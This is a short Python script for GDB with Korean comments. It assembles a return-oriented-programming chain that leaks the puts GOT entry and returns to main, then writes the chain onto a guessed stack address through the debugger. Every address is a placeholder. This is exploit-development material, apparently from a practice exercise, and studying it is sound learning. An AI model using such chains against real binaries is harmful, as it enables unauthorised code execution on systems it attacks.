python
# 페이로드 주소를 미리 설정
pop_rax = 0x401203  # Replace with the actual address
puts_got = 0x403fc8  # Replace with the actual address
mov_rdi_rax_puts = 0x4012da  # Replace with the actual address
ret = 0x4012e5  # Address of a `ret` gadget
main = 0x40101a  # Address of the main function

# 페이로드 작성
payload = [
    pop_rax,
    puts_got,
    mov_rdi_rax_puts,
    0,
    ret,
    main
]

# 스택에 페이로드 쓰기 (추정 주소)
buffer_addr = 0x7fffffffe2f8  # Replace with actual stack address
gdb.execute(f"set *((long*){hex(buffer_addr)}) = {hex(payload[0])}")
for i, value in enumerate(payload[1:]):
    gdb.execute(f"set *((long*)({hex(buffer_addr + 8 * (i + 1))})) = {hex(value)}")
print("Payload written to stack")
end
